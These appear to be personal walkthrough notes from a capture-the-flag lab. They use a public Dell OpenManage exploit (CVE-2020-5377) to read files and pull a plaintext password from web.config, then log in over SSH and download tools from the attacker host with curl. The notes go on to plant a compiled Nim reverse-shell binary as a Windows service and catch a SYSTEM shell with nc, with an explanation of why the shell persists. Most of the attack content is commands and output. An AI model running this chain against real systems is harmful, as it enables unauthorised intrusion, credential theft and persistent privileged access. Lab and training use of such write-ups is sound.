@@ -1,0 +1,120 @@
+
+
+
+on port 1311 - the about page
+Dell EMC OpenManage Server Administrator
+Version 9.4.0.2
+Apache Tomcat Webserver	Version 9.0.21
+Oracle Java Runtime Environment	Version 11.0.7
+OMACS	Version 9.4.0.2
+Server Administrator Common Framework	Version 9.4.0.2
+
+https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py
+
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# python3 CVE-2020-5377.py 10.6.66.96 10.201.53.53:1311
+[-] No server.pem certificate file found. Generating one...
+.+.......+.....+++++++++++++++++++++++++++++++++++++++*......+..+.......+.....+.+..+...+..........+...+...........+...+.+..+....+...+..+....+..+....+...+++++++++++++++++++++++++++++++++++++++*..............+.....+..........+..+....+.....+.......+.....+...+............+...+.+.....+......+..........+.........+.....+...+.+..+.............+.........+...+.........+.....+..........+...+........+.......+......+..+...+......+......+....+...........+.......+...........+.+...+..+.+...............+........+......+.............+..+.........+......+...+.+..............+.+..............+.+.....+.+...+.....+.......+...........+...+.+...+...........+.+.........+...........+......+.......+........+.......+...+..+...+...+.......+..............+...+.+.....+.......+.....+....+...+........+...+................+...+..+....+......+........+...+...+.......+...+.....+.........+.+..+...+.+......+........+....+......+..+............+.......+.....+....+............+.....+............+.+......+.........+......+......+........+.......+.....+...+.......+..+..........+.....+..........+......+......+....................+.............+..+.+..+............+.+...............+.........+.....+....+.........+...........+....+.....+..................+...+....+..+.+..+.............+...+.....+....+..+..................+......+.......+..+...+.........+...+.+............++++++
+.....+++++++++++++++++++++++++++++++++++++++*..+..+............+++++++++++++++++++++++++++++++++++++++*....+.....................................+.....+.+.....+...+.+.....+.+.....+.......+...+..+...+.......+........+....+...+......+..+...+.........+......+................+.....+...+......+......+.............+.....+.......+........+...+...+.+......+..+......+.......+..+......+.+......+........+.......+.....+.........+......+.......+........+.......+...............+.....+.+.....+.........+.+...........+.+..+.+.........+.....+...+....+......+........................+...+........+...+.........+................+......+.....+.+..+...+..........+..+..........+..+.........+.......+...+...........+...+......+.+........++++++
+-----
+Session: 17BC2E611133769D4BE78C40501160C8
+VID: 607896C2D52B7382
+
+file > /Windows/System32/inetsrv/config/applicationHost.config
+Reading contents of /Windows/System32/inetsrv/config/applicationHost.config:
+...
+     <site name="hacksmartersec" id="2" serverAutoStart="true">
+          <application path="/" applicationPool="hacksmartersec">
+            <virtualDirectory path="/" physicalPath="C:\inetpub\wwwroot\hacksmartersec" />
+         </application>
+
+...
+file > C:\inetpub\wwwroot\application\web.config
+Reading contents of C:\inetpub\wwwroot\application\web.config:
+
+file > C:\inetpub\wwwroot\hacksmartersec\web.config
+Reading contents of C:\inetpub\wwwroot\hacksmartersec\web.config:
+<configuration>
+  <appSettings>
+    <add key="Username" value="tyler" />
+    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh tyler@10.201.53.53    
+The authenticity of host '10.201.53.53 (10.201.53.53)' can't be established.
+ED25519 key fingerprint is SHA256:MvevGrInODrfb/nv+rYdT743Q0BOkhOmNo5qlrhXCUg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.201.53.53' (ED25519) to the list of known hosts.
+tyler@10.201.53.53's password: 
+
+Microsoft Windows [Version 10.0.17763.1821] 
+(c) 2018 Microsoft Corporation. All rights reserved. 
+
+tyler@HACKSMARTERSEC C:\Users\tyler>
+
+
+
+
+PS C:\Users\tyler\Documents> curl http://10.6.66.96:8000/PrivescCheck.ps1 -o priv.ps1
+PS C:\Users\tyler\Documents>  
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nim c -d:mingw --cpu:amd64 --app:gui -d:release -o:spoofer-scheduler.exe betterrevshell.nim
+
+
+
+
+PS C:\Program Files (x86)\Spoofer> curl http://10.6.66.96:8000/spoofer-scheduler.exe -o spoofer-scheduler.exe        
+PS C:\Program Files (x86)\Spoofer> sc.exe start spoofer-scheduler                                                    
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+PS C:\Program Files (x86)\Spoofer>
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53                                                                                
+listening on [any] 53 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.65.86] 50294
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+
+solid shell. persists past the StartService FAILED 1053
+
+
+Why the service fails (1053):
+
+Windows Service Control Manager (SCM) expects services to respond to control requests within a specific timeout (usually 30 seconds)
+Nim payload doesn't implement the Windows Service API (StartServiceCtrlDispatcher, etc.)
+The SCM sends a "start" signal, binary runs and connects the shell, but never reports back "I'm ready" to the SCM
+After the timeout, SCM gives up and reports error 1053 ("The service did not respond to the start or control request in a timely fashion")
+
+Why our shell persists:
+
+Even though the SCM considers the service "failed," the actual process (spoofer-scheduler.exe) is still running
+Our binary spawned cmd.exe and connected it to our socket
+The WaitForSingleObject(pi.hProcess, INFINITE) line in our code keeps the parent process alive, waiting for cmd.exe to exit
+The infinite while true: sleep(1000) loop at the end ensures the process never terminates
+Windows doesn't kill the process just because the service failed to start properly - it just marks it as failed in the SCM
+
+The SCM timeout is just a control mechanism - it doesn't forcefully terminate processes that don't respond.
+
+What others have done with GO
+
+https://github.com/daniellowrie/update_script
+
+https://manav-g-krishna.gitbook.io/tryhackme-writeups/hack-smarter-security
+
+
